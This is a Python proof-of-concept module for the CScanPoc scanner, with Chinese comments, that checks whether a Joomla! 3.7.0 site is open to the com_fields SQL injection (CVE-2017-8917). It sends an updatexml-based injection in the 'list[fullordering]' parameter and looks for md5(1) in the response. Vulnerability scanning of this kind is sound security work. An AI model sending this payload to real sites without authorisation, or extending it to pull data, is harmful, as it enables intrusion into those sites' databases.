# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Joomla_0001'  # 平台漏洞编号，留空
    name = 'Joomla! com_fields组件SQL注入漏洞(CNVD-2017-06861)'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2017-05-11'  # 漏洞公布时间
    desc = '''
        Joomla!是美国Open Source Matters团队的一套使用PHP和MySQL开发的开源、跨平台的内容管理系统(CMS)。
        Joomla! 3.7.0版本中的com_fields组件存在SQL注入漏洞，远程攻击者无需任何身份认证，可获取数据库敏感信息，包括管理员登录信息并控制网站后台。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-06861'  # 漏洞来源
    cnvd_id = 'CNVD-2017-06861'  # cnvd漏洞编号
    cve_id = 'CVE-2017-8917'  # cve编号
    product = 'Joomla!'  # 漏洞应用名称
    product_version = 'Joomla! 3.7.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5320470d-42de-45e8-a520-88ce27ddeb4c'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-19'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2017-8917
            payload = {'option': 'com_fields', 'view': 'fields', 'layout': 'modal',
                       'list[fullordering]': 'updatexml(0x3a,concat(1,(select md5(1))),1)'}
            request = requests.get('{target}'.format(
                target=self.target), params=payload)
            r = request.text
            if 'c4ca4238a0b923820dcc509a6f75849b' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
